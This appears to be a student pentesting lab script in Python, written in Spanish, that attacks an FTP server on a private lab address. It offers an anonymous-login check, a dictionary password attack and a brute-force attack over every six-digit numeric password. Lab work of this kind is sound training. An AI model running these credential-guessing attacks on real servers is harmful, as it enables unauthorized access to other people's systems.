#Práctica 8: Pentesting de servicios para conexión remota
#--------------------------------------------------------------

from ftplib import FTP

#Conexion FTP
def conexionFTP (ip, usuario, password):
    try:
        conexion = FTP(host=ip, timeout=1)
        conexion.login(usuario, password)
        return True
    except IOError:
        return False

#Parte 1 - conexión FTP Anónima
def anonima(ip):
    print("Conectando de manera anónima ...")
    if conexionFTP(ip, 'anonymous', ''):
        print("Conexión anónima establecida")
    else:
        print("No se pudo conectar con el servidor "+ip+" de manera anónima")
    print("----------------------------------------------------------------------------")
    input("Presione una tecla para continuar ...")
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")

#Parte 2 - conexión FTP usando un "Diccionario"
def diccionario(ip, usuario):
    #Extrayendo diccionario
    with open('diccionario_001.txt', "r", encoding="utf-8") as diccionarioTexto:
        textoDiccionario = diccionarioTexto.read()
    diccionario = textoDiccionario.split('\n')
    #Probando claves del diccionario
    print("Conectando con el usuario "+usuario+" y el diccionario de constraseñas ...")
    for clave in diccionario:
        print("Probando la clave => "+clave)
        if conexionFTP(ip, usuario, clave):
            print("----------------------------------------------------------------------------")
            print("Conexión establecida con :")
            print("Usuario => "+usuario)
            print("Contraseña => "+clave)
            print("----------------------------------------------------------------------------")
            input("Presione una tecla para continuar ...")
            print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
            return
    print("No se pudo conectar con el servidor "+ip+", con el usuario "+usuario+" y con alguna clave del diccionario")
    print("----------------------------------------------------------------------------")
    input("Presione una tecla para continuar ...")
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")

#Parte 3 - conexión FTP usando "Fuerza Bruta"
def fuerzaBruta(ip, usuario):
    print("Conectando con el usuario "+usuario+" y fuerza bruta ...")
    numero = 0
    while numero <= 999999:
        clave = str(numero).zfill(6)
        print("Probando la clave => "+clave)
        if conexionFTP(ip, usuario, clave):
            print("----------------------------------------------------------------------------")
            print("Conexión establecida con :")
            print("Usuario => "+usuario)
            print("Contraseña => "+clave)
            print("----------------------------------------------------------------------------")
            input("Presione una tecla para continuar ...")
            print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
            return
        numero+=1
    print("No se pudo conectar con el servidor "+ip+", con el usuario "+usuario+" y con alguna clave entre 0 y 999999")
    print("----------------------------------------------------------------------------")
    input("Presione una tecla para continuar ...")
    print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")

#Variables de conexion
ipHost = '192.168.0.11' #IP del Host
usuarioDiccionario = 'pony' #Usuario con la clave del diccionario
usuarioFuerzaBruta = 'pony1' #Usuario con la clave para fuerza bruta1


#Menu
print("..........PRÁCTICA 8: PENTESTING DE SERVICIOS PARA CONEXIÓN REMOTA..........")

while True:
    print("----------------------------------------------------------------------------")
    print("Info. Servidor")
    print("Ip del servidor => "+ipHost)
    print("Usuario para Diccionario => "+usuarioDiccionario)
    print("Usuario para Fuerza Bruta => "+usuarioFuerzaBruta)
    print("----------------------------------------------------------------------------")
    print("OPCIONES DEL MENU")
    print("[1] => Conexión FTP Anónima")
    print("[2] => Conexión FTP usando un \"Diccionario\"")
    print("[3] => Conexión FTP usando \"Fuerza Bruta\"")
    print("[0] => Salir")
    opc = input("Seleccione una opcion: ")
    print("----------------------------------------------------------------------------")

    #Opciones
    if opc == '1':
        anonima(ipHost)
    elif opc == '2':
        diccionario(ipHost, usuarioDiccionario)
    elif opc == '3':
        fuerzaBruta(ipHost, usuarioFuerzaBruta)
    else:
        break

print("ADIOS !!!")